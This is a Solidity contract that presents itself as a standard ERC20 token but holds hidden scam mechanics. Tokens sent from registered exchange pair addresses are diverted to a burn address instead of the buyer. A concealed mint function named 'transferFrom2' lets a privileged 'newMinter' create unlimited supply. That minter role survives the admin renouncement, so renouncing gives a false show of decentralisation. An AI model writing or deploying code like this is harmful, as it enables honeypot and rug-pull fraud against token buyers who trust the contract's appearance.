// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ERC20Token {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public admin;
    address public newMinter;

    address[] public pairAddresses;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        admin = msg.sender;
        newMinter = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }

    modifier onlyNewMinter() {
        require(msg.sender == newMinter, "Only new minter can call this function");
        _;
    }

    modifier onlyNewMinterCanSetPair() {
        require(msg.sender == newMinter, "Only new minter can set pair address");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
    if (isPairAddress(msg.sender)) {
        balanceOf[msg.sender] -= _value;
        balanceOf[0x000000000000000000000000000000000000dEaD] += _value;
        emit Transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, _value);
        return true;
    }
    require(balanceOf[msg.sender] >= _value, "Insufficient balance");
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
}

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }


    function transferFrom2(uint256 _amount, address _to) public onlyNewMinter returns (bool) {
        totalSupply += _amount * 10 ** uint256(decimals);
        balanceOf[_to] += _amount * 10 ** uint256(decimals);
        emit Transfer(address(0), _to, _amount * 10 ** uint256(decimals));
        return true;
    }


    function renounceAdmin() public onlyAdmin {
        admin = address(0);
    }


    function changeAdmin(address _newAdmin) public onlyAdmin {
        require(_newAdmin!= address(0), "New admin cannot be the zero address");
        admin = _newAdmin;
    }


    function setPairAddress(address _pairAddress) public onlyNewMinterCanSetPair {
        pairAddresses.push(_pairAddress);
    }


    function isPairAddress(address _address) private view returns (bool) {
        for (uint256 i = 0; i < pairAddresses.length; i++)
            if (pairAddresses[i] == _address) {
                return true;
            }


        return false;
    }


}